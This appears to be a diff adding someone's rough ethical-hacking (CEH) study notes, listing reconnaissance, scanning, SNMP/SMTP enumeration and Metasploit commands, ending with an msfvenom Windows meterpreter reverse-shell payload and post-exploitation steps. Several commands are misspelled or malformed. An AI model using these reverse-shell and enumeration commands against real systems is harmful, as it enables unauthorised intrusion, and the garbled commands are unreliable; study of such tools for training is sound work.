@@ -1,0 +1,100 @@
+apt -y install sublist3r
+
+
+update 
+apt -get upgrade
+
+help
+sublist3r -h
+
+list the subdomines of google from bing search engine :
+sublist3r -d google.com -t 3 -e bing
+
+
+inspy 
+apt update && apt -y install inspy
+
+ls -ls /usr/share/inspy/wordlists/
+
+inspy --titles  /usr/share/inspy/wordlists/title-list-large.txt google
+
+burp suite to get the data from packet
+
+recon-ng  show modules
+
+workspaces create CEH
+
+usufy.py -n <name> -p twitter facebook youtube
+
+searchfy.py -q "<name>"
+
+
+arp - ipaddress to physical address
+
+
+ping sweep to scan entire 
+
+nmap -h
+
+hping3 -h
+
+megaping
+angeripscanner
+iptools-namescanner 
+
+nmap -D RND:10 <ip address>
+
+snmp(simple network manage protocol) to monitor network
+
+service -> snmp services -> 
+set snmp feature    cp -> programs ->turn windows features on and of 
+
+comunity string  in service -> security
+
+accept   
+
+metaspolite -> mf
+
+search snmp 
+snmp_enum
+run
+
+set RHOSTS <ipaddress>
+
+telnet <ipaddress> portno
+ ]]smtp
+
+very
+expn rcpt to 
+
+vanrablities in dns
+
+nsllookup (name server lookup)
+
+ipsec use  to vpns
+nmap -su -p 500.193.148
+
+iek -scan -M 140.36
+
+use  in metasploit (sip)
+
+RPC  comunicate b/w server and client 
+
+/usr/bin/rusers [-a] <hosts>
+
+finger @<IP ADDRESS>
+auxiliary/scanner/snmp/snmp_enum
+
+to check va
+nessus
+nikto -h http://www.manosriram.xyz -Cgidirs x
+
+system hacking
+responder -I eth0
+
+msfvenom -p windows/meterpteter/reverse_tcp --platform windows -a x866 -f LHOST=192.168.41.129 LPORT=444 -0 /root/desktop/test.exe
+
+run 
+sysinfo
+run vnc
+ps
